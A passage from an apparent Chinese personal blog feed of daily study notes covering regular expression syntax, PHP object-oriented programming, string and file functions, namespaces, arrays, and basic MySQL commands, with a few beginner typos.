        <content type="html"><![CDATA[<pre><code>字符     描述\        将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\\’ 匹配 “\” 而 “\(” 则匹配 “(”。^        匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。$        匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。*        匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于&#123;0,&#125;。+        匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 &#123;1,&#125;。?        匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 &#123;0,1&#125;。&#123;n&#125;       n是一个非负整数。匹配确定的 n 次。例如，’o&#123;2&#125;’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。&#123;n,&#125;      n是一个非负整数。至少匹配n 次。例如，’o&#123;2,&#125;’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o&#123;1,&#125;’ 等价于 ‘o+’。’o&#123;0,&#125;’ 则等价于 ‘o*’。&#123;n,m&#125;     m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o&#123;1,3&#125;” 将匹配 “fooooood” 中的前三个 o。’o&#123;0,1&#125;’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。?         当该字符紧跟在任何一个其他限制符 (*, +, ?, &#123;n&#125;, &#123;n,&#125;, &#123;n,m&#125;) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。.         匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用象 ‘[.\n]’ 的模式。(pattern)    匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘′或‘’。(?:pattern)    匹 配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， ‘industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。(?=pattern)    正 向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，’Windows (?=95|98|NT|2000)’ 能匹配 “Windows 2000″ 中的 “Windows” ，但不能匹配 “Windows 3.1″ 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。(?!pattern)    负 向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如’Windows (?!95|98|NT|2000)’ 能匹配 “Windows 3.1″ 中的 “Windows”，但不能匹配 “Windows 2000″ 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始x|y    匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。[xyz]    字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。[^xyz]    负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p&#39;。[a-z]    字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。[^a-z]    负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。\b    匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。\B    匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。\cx    匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。\d    匹配一个数字字符。等价于 [0-9]。\D    匹配一个非数字字符。等价于 [^0-9]。\f    匹配一个换页符。等价于 \x0c 和 \cL。\n    匹配一个换行符。等价于 \x0a 和 \cJ。\r    匹配一个回车符。等价于 \x0d 和 \cM。\s    匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。\S    匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。\t    匹配一个制表符。等价于 \x09 和 \cI。\v    匹配一个垂直制表符。等价于 \x0b 和 \cK。\w    匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。\W    匹配任何非单词字符包括下划线。等价于 ‘[^A-Za-z0-9_]’。\xn    匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41′ 匹配 “A”。’\x041′ 则等价于 ‘\x04′ &amp; “1″。正则表达式中可以使用 ASCII 编码。.\num    匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1′ 匹配两个连续的相同字符。\n    标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。\nm    标 识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。\nml    如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。\un    匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。例子 匹配32位md5/^[a-z0-9]&#123;32&#125;$/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的面向对象</title>
      <link href="/2022/11/14/20221114/"/>
      <url>/2022/11/14/20221114/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h4><p>类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。<br>对象 − 是类的实例。<br>对象的主要三个特性：<br>1.对象的行为：可以对对象施加那些操作，开灯，关灯就是行为。<br>2.对象的形态：当施加那些方法是对象如何响应，颜色，尺寸，外型。<br>3.对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。</p><h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</p><p>成员函数 − 定义在类的内部，可用于访问对象的数据。</p><p>继承 − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</p><p>父类 − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</p><p>子类 − 一个类继承其他类称为子类，也可称为派生类。</p><p>多态 − 多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</p><p>重载 − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</p><p>抽象性 − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</p><p>封装 − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</p><p>构造函数 − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p><p>析构函数 − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</p><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><pre><code>【定义函数】&lt;?php                                      //1.定义类class 类名 &#123;  /* 成员变量 */  var $var1;  var $var2 = &quot;constant string&quot;;  /* 成员函数 */  function 成员函数的函数名 ($arg1, $arg2)   &#123;      return $this-&gt;函数 = 变量             //赋值并调用函数  &#125;&#125;?&gt;$对象名 = new 类名;                         //2.创建对象echo $对象名-&gt;成员函数(&quot;传入的参数&quot;);        //3.调用成员方法大括号&#123;&#125;内可以定义变量和方法变量使用 var 来声明, 变量也可以初始化值函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。变量 $this 代表自身的对象【构造函数】在创建对象时， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。&lt;?phpclass 类名 &#123;   function __construct() &#123;       print &quot;构造函数&quot;;       $this-&gt;name = &quot;&quot;;   &#125;   function __destruct() &#123;       print &quot;销毁&quot; . $this-&gt;name . &quot;\n&quot;;   &#125;&#125;$obj = new 类名();?&gt;【继承】子类继承父类的特征和行为，使得子类对象具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为(父类=基类)&lt;?php // 子类扩展站点类别class 类名 &#123;           //extends继承一个类   var $category;    function setCate($par)&#123;        $this-&gt;category = $par;    &#125;    function getCate()&#123;        echo $this-&gt;category . PHP_EOL;    &#125;&#125;注意:PHP 不支持多继承【方法重写】顾名思义重新定义function【访问控制】PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有）protected(受保护的)只能被自身子父类访问private(私有的)只能被定义的类访问publice(公有的)可以在任何地方访问类属性必须被定义，var视为publice【接口】概念:指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。特性:通过interface定义，但是其中定义的所有方法都必须是公有而且要是空的。类可以实现多个接口，用逗号来分隔多个接口的名称。【常量】在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。常量的值必须是一个定值【接口与抽象类】1. 接口（1）对接口的使用是通过关键字implements（2）接口不能定义成员变量（包括类静态变量），能定义常量（3）子类必须实现接口定义的所有方法（4）接口只能定义不能实现该方法（5）接口没有构造函数（6）接口中的方法和实现它的类默认都是public类型的2. 抽象类（1）对抽象类的使用是通过关键字extends（2）不能被实例化，可以定义子类必须实现的方法（3）子类必须定义父类中的所有抽象方法，这些方法的访问控制必须和父类中一样（或者更为宽松）（4）如一个类中有一个抽象方法，则该类必须定义为抽象类（5）抽象类可以有构造函数（6）抽象类中的方法可以使用private,protected,public来修饰。（7）一个类可以同时实现多个接口，但一个类只能继承于一个抽象类。【关键字】1.Static(1)声明类属性或方法为 static(静态)，就可以不实例化类而直接访问(2)静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。(3)由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。(4)静态属性不可以由对象通过 -&gt; 操作符来访问。2.Final(1)如果父类中的方法被声明为 final，则子类无法覆盖该方法。(2)如果一个类被声明为 final，则不能被继承。【调用父类构造方法】PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() </code></pre><h4 id="面向对象暂时先写到这里，后面有新的认识再回来更改。"><a href="#面向对象暂时先写到这里，后面有新的认识再回来更改。" class="headerlink" title="面向对象暂时先写到这里，后面有新的认识再回来更改。"></a>面向对象暂时先写到这里，后面有新的认识再回来更改。</h4><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="当废话满天飞的时候，沉默是人类最大的贡献。"><a href="#当废话满天飞的时候，沉默是人类最大的贡献。" class="headerlink" title="当废话满天飞的时候，沉默是人类最大的贡献。"></a>当废话满天飞的时候，沉默是人类最大的贡献。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的常见字符操作函数</title>
      <link href="/2022/11/13/20221113/"/>
      <url>/2022/11/13/20221113/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="仔细收集php的常见字符操作函数"><a href="#仔细收集php的常见字符操作函数" class="headerlink" title="仔细收集php的常见字符操作函数"></a>仔细收集php的常见字符操作函数</h4><pre><code>addcslashes — 以 C 语言风格使用反斜线转义字符串中的字符addslashes — 使用反斜线引用字符串bin2hex — 函数把包含数据的二进制字符串转换为十六进制值chop — rtrim 的别名 — 删除字符串末端的空白字符（或者其他字符）chr — 返回指定的字符 — chr ( int $ascii )chunk_split — 将字符串分割成小块convert_cyr_string — 将字符由一种 Cyrillic 字符转换成另一种convert_uudecode — 解码一个 uuencode 编码的字符串convert_uuencode — 使用 uuencode 编码一个字符串count_chars — 返回字符串所用字符的信息crc32 — 计算一个字符串的 crc32 多项式crypt — 单向字符串散列echo — 输出一个或多个字符串explode — 使用一个字符串分割另一个字符串fprintf — 将格式化后的字符串写入到流get_html_translation_table — 返回使用 htmlspecialchars 和 htmlentities 后的转换表hebrev — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew）hebrevc — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符hex2bin — 转换十六进制字符串为二进制字符串html_entity_decode — Convert HTML entities to their corresponding charactershtmlentities — 将字符转换为 HTML 转义字符htmlspecialchars_decode — 将特殊的 HTML 实体转换回普通字符htmlspecialchars — 将特殊字符转换为 HTML 实体implode — 将一个一维数组的值转化为字符串join — 别名 implodelcfirst — 使一个字符串的第一个字符小写levenshtein — 计算两个字符串之间的编辑距离localeconv — Get numeric formatting informationltrim — 删除字符串开头的空白字符（或其他字符）md5_file — 计算指定文件的 MD5 散列值md5 — 计算字符串的 MD5 散列值metaphone — Calculate the metaphone key of a stringmoney_format — 将数字格式化成货币字符串nl_langinfo — Query language and locale informationnl2br — 在字符串所有新行之前插入 HTML 换行标记number_format — 以千位分隔符方式格式化一个数字ord — 转换字符串第一个字节为 0-255 之间的值parse_str — 将字符串解析成多个变量print — 输出字符串printf — 输出格式化字符串quoted_printable_decode — 将 quoted-printable 字符串转换为 8-bit 字符串quoted_printable_encode — 将 8-bit 字符串转换成 quoted-printable 字符串quotemeta — 转义元字符集rtrim — 删除字符串末端的空白字符（或者其他字符）setlocale — 设置地区信息sha1_file — 计算文件的 sha1 散列值sha1 — 计算字符串的 sha1 散列值similar_text — 计算两个字符串的相似度soundex — Calculate the soundex key of a stringsprintf — Return a formatted stringsscanf — 根据指定格式解析输入的字符str_contains — Determine if a string contains a given substringstr_ends_with — Checks if a string ends with a given substringstr_getcsv — 解析 CSV 字符串为一个数组str_ireplace — str_replace 的忽略大小写版本str_pad — 使用另一个字符串填充字符串为指定长度str_repeat — 重复一个字符串str_replace — 子字符串替换str_rot13 — 对字符串执行 ROT13 转换str_shuffle — 随机打乱一个字符串str_split — 将字符串转换为数组str_starts_with — Checks if a string starts with a given substringstr_word_count — 返回字符串中单词的使用情况strcasecmp — 二进制安全比较字符串（不区分大小写）strchr — 别名 strstrstrcmp — 二进制安全字符串比较strcoll — 基于区域设置的字符串比较strcspn — 获取不匹配遮罩的起始子字符串的长度strip_tags — 从字符串中去除 HTML 和 PHP 标记stripcslashes — 反引用一个使用 addcslashes 转义的字符串stripos — 查找字符串首次出现的位置（不区分大小写）stripslashes — 反引用一个引用字符串stristr — strstr 函数的忽略大小写版本strlen — 获取字符串长度strnatcasecmp — 使用“自然顺序”算法比较字符串（不区分大小写）strnatcmp — 使用自然排序算法比较字符串strncasecmp — 二进制安全比较字符串开头的若干个字符（不区分大小写）strncmp — 二进制安全比较字符串开头的若干个字符strpbrk — 在字符串中查找一组字符的任何一个字符strpos — 查找字符串首次出现的位置strrchr — 查找指定字符在字符串中的最后一次出现strrev — 反转字符串strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）strrpos — 计算指定字符串在目标字符串中最后一次出现的位置strspn — 计算字符串中全部字符都存在于指定字符集合中的第一段子串的长度。strstr — 查找字符串的首次出现strtok — 标记分割字符串strtolower — 将字符串转化为小写strtoupper — 将字符串转化为大写strtr — 转换指定字符substr_compare — 二进制安全比较字符串（从偏移位置比较指定长度）substr_count — 计算字串出现的次数substr_replace — 替换字符串的子串substr — 返回字符串的子串trim — 去除字符串首尾处的空白字符（或者其他字符）ucfirst — 将字符串的首字母转换为大写ucwords — 将字符串中每个单词的首字母转换为大写vfprintf — 将格式化字符串写入流vprintf — 输出格式化字符串vsprintf — 返回格式化字符串wordwrap — 打断字符串为指定数量的字串is_array 判断是否为数组count 数组的元素数目array_search — 在数组中搜索给定的值，如果成功则返回相应的键名array_key_exists()在给定的 key 存在于数组中时返回 TRUEarray_unshift()  将传入的单元插入到 array 数组的开头。注意单元是作为整体被插入的，因此传入单元将保持同样的顺序。所有的数值键名将修改为从零开始重新计数，所有的文字键名保持不变array_shift()  将array 的第一个单元移出并作为结果返回，将 array 的长度减一并将所有其它单元向前移动一位。所有的数字键名将改为从零开始计数，文字键名将不变。array_unique()  接受 array 作为输入并返回没有重复值的新数组。注意键名保留不变。 array_unique()  先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名。这并不意味着在未排序的 array 中同一个值的第一个出现的键名会被保留。 in_array — 检查数组中是否存在某个值  如果找到指定的值则返回 TRUE，否则返回 FALSE 。in_array()是区分大小写的。PHP_EOL 为换行符</code></pre><p>部分实例</p><pre><code>$a=&#39;123456&#39;;echo $str.&quot; 一共有 &quot;.strlen($a).&quot;字符&quot;;//去掉空格echo trim($str);echo $str1;//查找字符串 返回位置echo strpos($str,&#39;暗月&#39;);//截取字符串echo substr($str,strpos($str,&#39;暗月&#39;),strpos($str,&#39;培训&#39;));//md5  加密echo md5($a);//通过下标 取字符的值echo $a[0];//字符串替换函数$a1=str_replace(&#39;1&#39;,&#39;0&#39;,$a);echo $a1;</code></pre><h4 id="具体的使用方法请查看手册"><a href="#具体的使用方法请查看手册" class="headerlink" title="具体的使用方法请查看手册"></a>具体的使用方法请查看手册</h4><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="最后，分享一句圆桌派的话：“你可以是孤岛，也可-以连成一片。”"><a href="#最后，分享一句圆桌派的话：“你可以是孤岛，也可-以连成一片。”" class="headerlink" title="最后，分享一句圆桌派的话：“你可以是孤岛，也可 以连成一片。”"></a>最后，分享一句圆桌派的话：“你可以是孤岛，也可 以连成一片。”</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础（3）</title>
      <link href="/2022/11/12/20221112/"/>
      <url>/2022/11/12/20221112/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="PHP超级全局变量"><a href="#PHP超级全局变量" class="headerlink" title="PHP超级全局变量"></a>PHP超级全局变量</h4><p>PHP超级全局变量列表：<br>$GLOBALS　　一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br>$_SERVER　　一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组<br>$_REQUEST　　用于收集HTML表单提交的数据。<br>它可以获取 cookie  get  post<br>$_POST　　应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。<br>$_GET　　应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。<br>Array []<br>$_FILES　　<br>$_ENV　　<br>$_COOKIE　　<br>$_SESSION</p><h4 id="PHP-Include-文件"><a href="#PHP-Include-文件" class="headerlink" title="PHP Include 文件"></a>PHP Include 文件</h4><p>服务器端包含用于创建可在多个页面重复使用的函数、页眉、页脚或元素。</p><pre><code>将 PHP 文件的内容插入另一个 PHP 文件:include &#39;filename&#39;;require &#39;filename&#39;;错误处理方面:require 会生成致命错误（E_COMPILE_ERROR）并停止脚本include 只生成警告（E_WARNING），但脚本会继续</code></pre><h4 id="PHP-文件处理"><a href="#PHP-文件处理" class="headerlink" title="PHP 文件处理"></a>PHP 文件处理</h4><p>操作文件:<br>readfile() 函数读取文件，并把它写入输出缓冲。<br>文件打开/读取/关闭:<br>fopen(“AAA.txt”,”/r”)函数的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。</p><p>打开模式详解:<br>r:打开只读文件，指针在文件开头<br>w:只写文件，如果不存在就删除或创建，指针在文件开头<br>a:只写文件，保留数据，指针在结尾，如果文件不存在就创建新文件<br>x:创建新文件为只写，如果文件存在就返回false和错误<br>r+:打开文件为读/写，指针在开头<br>w+:打开文件为读/写，如果不存在就创建或删除，指针在开头<br>a+:打开文件为读/写，保留数据，指针在结尾，如果不存在就创建新文件<br>x+:创建文件为读/写，如果文件已存在就返回false和错误</p><p>fread($文件名,filesize(“AAA.txt”));<br>第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数</p><p>fclose($文件名);<br>关闭打开的文件，节约服务器资源</p><p>fgets($文件名);<br>从文件读取单行，调用后，文件指针会移动到下一行。</p><p>feof($myfile);<br>检查是否已到达文件末尾(EOF)，常用于遍历未知长度的数据</p><p>fgetc($myfile);<br>从文件中读取单个字符，调用后，文件指针会移动到下一个字符。</p><p>fopen(“文件名”, “w”)；<br>如果用来打开不存在的文件，此函数会创建文件，假定文件被打开为写入（w）或增加（a）。</p><p>fwrite($文件名,要发送的字符串);<br>写入文件,会发生覆盖原数据</p><h4 id="文件的-复制-删除-重名"><a href="#文件的-复制-删除-重名" class="headerlink" title="文件的 复制 删除 重名"></a>文件的 复制 删除 重名</h4><p>php文件重命名：函数rename()。<br>php文件复制：函数copy();<br>php文件删除：函数unlink();</p><h4 id="获取文件属性"><a href="#获取文件属性" class="headerlink" title="获取文件属性"></a>获取文件属性</h4><pre><code>file_exists(string $filename)是否存在,返回false或trueis_file() 是否为文件,返回false或truefilesize() 文件大小,返回false或trueis_readable() 文件名是否可读,返回false或trueis_writable() 文件名是否可改,返回false或trueis_executable() 文件名是否可执行,返回false或truefilectime() 文件创建时间，返回UNX时间戳filemtime() 文件修改时间，返回UNX时间戳fileatime() 上次访问时间，返回UNX时间戳stat() 获取大部分属性值，返回包含文件信息的数组</code></pre><h4 id="PHP目录操作"><a href="#PHP目录操作" class="headerlink" title="PHP目录操作"></a>PHP目录操作</h4><p>新建目录：mkdir(路径，权限，递归创建)<br>删除目录：rmdir()<br>移动（改名）：rename()<br>获取目录内容：<br>//打开目录<br>目录句柄 = opendir()<br>//读取目录<br>文件名 = readdir(目录句柄)<br>依次读取文件名，同时向下移动文件句柄指针，读取不到则返回false<br>//关闭目录<br>closedir()</p><p>注:前目录. 上级目录用..</p><h4 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h4><p>定义：人为的将内存进行分隔<br>作用：让不同内存区域的同名结构共存<br>目的：解决重名结构问题<br>空间元素：函数，常量，类，不包括变量！！!<br>语法:<br>namespace 空间名<br>namespace 空间名\子空间</p><p>命名空间访问(url)<br>1.定名称访问：直接访问空间元素的名字（只访问自己命名空间的元素）<br>2.名称访问：使用自己当前的子空间名字+ \ + 元素名字<br>3.访问：\ + 全局空间 + \  +  元素名字<br>注：任何空间元素访问，只针对函数，类，常量，不包括变量！！!</p><p>全局空间(C盘)<br>如果定义了命名空间，非限定名称的寻找系统常量的方式：<br>首先,自己的空间内找<br>然后,果找不到元素<br>系统常量–&gt;进入全局空间寻找<br>系统类–&gt;不会自动进入全局空间寻找，而是会报错</p><pre><code>命名空间的引入1.空间引入方式：use关键字    (1)类：use 空间名\类名    (2)数：use function 空间名\函数名    (3)量：use const 空间名\常量名2.当引入元素时重名，通过 as 来起别名    use 空间名\类名 as 别名3.引入多个元素    use 空间名\&#123;        类名，        function 函数名，        const 常量    &#125;       4. 引入空间    use 空间名</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="此爱隔山海，山海不可平。"><a href="#此爱隔山海，山海不可平。" class="headerlink" title="此爱隔山海，山海不可平。"></a>此爱隔山海，山海不可平。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础（2）</title>
      <link href="/2022/11/11/20221111/"/>
      <url>/2022/11/11/20221111/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><pre><code>文件1function add()&#123;    echo &#39;执行&#39;;&#125;add增加，del删除，update更改，select查询文件2include (&#39;文件1.php&#39;);          //调用文件add();                         //调用函数include与require区别include在没有这个文件时报错并执行，但是require报错但是不执行include_once与require_once区别可以重复调用文件，区别同上</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><pre><code>索引数组:$arr=[1,2,3,4,5];var_dump($arr);或$arr=array(1,2,3,4,5);var_dump($arr);关联数组:$arr=[    &#39;A&#39;=&gt;&#39;a&#39;,    &#39;B&#39;=&gt;&#39;b&#39;;];var_dump($arr);二维(多维)数组:$arr=[    &#39;A&#39;=&gt;[        &#39;a&#39;,        &#39;b&#39;,        &#39;c&#39;,    ]];var_dump($arr);</code></pre><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p>增加:直接声明$arr[位置]=’内容’;<br>删除:unset($arr[位置]);<br>修改:重新定义<br>对于多维数组要var_dump($arr[第一层位置][第二层位置]…….);<br>获取循环次数:echo count($arr);</p><pre><code>遍历foreach ($arr as $key =&gt; $value) &#123;    echo $key.&#39;&lt;br/&gt;&#39;;&#125;list($a , $b , $c , $d , $e) = $arr;echo $a,$b,$c,$d;一一赋值，多出来的跳过，只对有索引的有效while (list($key , $val) = each($arr)) &#123;    echo $key.&#39;--&#39;.$val.&#39;&lt;br/&gt;&#39;;&#125;排序sort() - 对数组进行升序排列rsort() - 对数组进行降序排列asort() - 根据关联数组的值，对数组进行升序排列ksort() - 根据关联数组的键，对数组进行升序排列arsort() - 根据关联数组的值，对数组进行降序排列krsort() - 根据关联数组的键，对数组进行降序排列数组的合拼$array1 =array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);$array2 = array(&#39;a1&#39;=&gt;&#39;php&#39;,&#39;a2&#39;=&gt;&#39;python&#39;,&#39;a3&#39;=&gt;&#39;java&#39;);$array3 = array_merge($array1,$array2);添加到指定位置array_splice(数组，位置，删除几个，增加元素）</code></pre><h4 id="超全局数组"><a href="#超全局数组" class="headerlink" title="超全局数组"></a>超全局数组</h4><p>配合html前端页面method=’get/post’<br>var_dump($_GET);获取GET的参(显示内容在URL)<br>var_dump($_POST);获取POST的参(不显示)<br>var_dump($_REQUEST);都可以获取<br>前端name所设置的会把参数传到后端<br>name=’username’<br>$username=$_GET[‘username’];</p><h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><pre><code>notice注意                   //后续代码会继续执行warning警告                  //后续代码会继续执行fatal error致命错误          //后续代码不会继续执行@可以消除警报(除了fatal error)在ini配置文件里display_errors:On可以取消报错(所有)在ini配置文件里error_log找错误日志</code></pre><h4 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h4><p>时间戳:时间戳是从1970年1月1日（UTC/GMT的午夜）开始所经过的秒数，不考虑闰秒。<br>配置文件可改时区，不详细讲</p><h4 id="数据库简介-dos操作"><a href="#数据库简介-dos操作" class="headerlink" title="数据库简介(dos操作)"></a>数据库简介(dos操作)</h4><pre><code>对数据库的解释:数据库相当于文件夹，表相当于文件，字段就是内容。注释符:#    &quot;--  &quot;    /* */&lt;不是内部命令就更改环境变量&gt;【库操作】连接数据库:mysql -uroot -p查库:show databases;建库creat database 库名;删库drop database 库名;退出mysql &gt; exit;mysql &gt; quit;mysql &gt; \q;重命名数据库RENAME database olddbname TO newdbname【表操作】进库:use 库名;建表:creat table 表名(id int,字段名 数据类型(长度) , 字段名 数据类型(位数));建表命令:show creat table 表名;改表名:alter table 原表名 rename 新名字查表:show tables;select * from table_name删表:drop table 表名;查表结构:desc 表名;                      //字段类型，主键，是否为空等属性，但不显示外键【字段操作】建表字段:alter table 表名 add 字段名 (字段类型)改表字段:alter table 表名 change 原来的字段名 现在的字段名 数据类型(位数);改表字段值:alter table 表名 modify 字段名 修改后的值删表字段:alter table 表名 drop 字段名更改表的存储引擎:alter table 